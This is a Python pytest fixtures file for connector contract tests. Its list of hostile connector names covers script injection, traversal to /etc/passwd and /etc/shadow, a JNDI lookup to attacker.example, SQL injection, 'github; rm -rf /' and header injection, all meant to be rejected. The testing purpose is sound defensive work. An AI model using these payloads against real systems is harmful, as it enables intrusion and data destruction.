"""Shared fixtures for the connector contract tests.

There is no provider double here and no fake connector, because there is
nothing to fake: Mission 11.1 ships contracts and an empty allowlist, so
every test in this package exercises real schema validation and the real
registry rather than a stand-in.
"""

from __future__ import annotations

import pytest

from orion.connectors import Capability, ConnectorSpec

#: Strings that must never be accepted as a connector name, and must never
#: make a lookup succeed. Drawn from the same families
#: `tests/orchestrator/test_intent.py` uses for untrusted utterances: markup,
#: injection, traversal, schemes, control characters, bidirectional overrides
#: and sheer size. A connector name is an identifier, so *all* of these are
#: refusals rather than values to sanitise.
HOSTILE_NAMES: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "..\\..\\windows\\system32",
    "http://attacker.example/mcp",
    "https://attacker.example",
    "file:///etc/shadow",
    "${jndi:ldap://attacker.example/a}",
    "{{7*7}}",
    "'; DROP TABLE decisions; --",
    "github; rm -rf /",
    "github\x00admin",
    "github\nnewline",
    "github\r\nSet-Cookie: evil=1",
    "‮github",
    "GitHub",
    "GITHUB",
    "git-hub",
    "git hub",
    "1github",
    "_github",
    "",
    " ",
    "x" * 65,
    "x" * 100_000,
    "café",
    "🙂",
)


def _short_id(index: int, name: str) -> str:
    """A compact, stable id for one hostile name.

    Parametrising on the raw string is not an option: pytest writes the test
    id into `PYTEST_CURRENT_TEST`, and Windows refuses an environment
    variable over 32767 characters, so the 100k-character entry above turns
    into a collection error rather than a passing refusal. Truncating the id
    keeps the oversized input *in the suite*, which is the point of having
    it, while keeping the id readable in failure output.
    """
    head = name[:20].encode("unicode_escape").decode("ascii")
    return f"{index:02d}-{head or 'empty'}-len{len(name)}"


#: `HOSTILE_NAMES` wrapped for `@pytest.mark.parametrize`, with short ids.
HOSTILE_NAME_PARAMS: tuple[object, ...] = tuple(
    pytest.param(name, id=_short_id(index, name)) for index, name in enumerate(HOSTILE_NAMES)
)


@pytest.fixture
def spec() -> ConnectorSpec:
    """A structurally valid spec. Deliberately not in the allowlist.

    Being constructible is not being permitted: a `ConnectorSpec` is a shape,
    and only `CONNECTOR_ALLOWLIST` grants anything. Several tests below rely
    on exactly that distinction.
    """
    return ConnectorSpec(
        name="example_read_only",
        capability=Capability.READ,
        description="A structurally valid spec used by tests. Not allowlisted, not implemented.",
    )
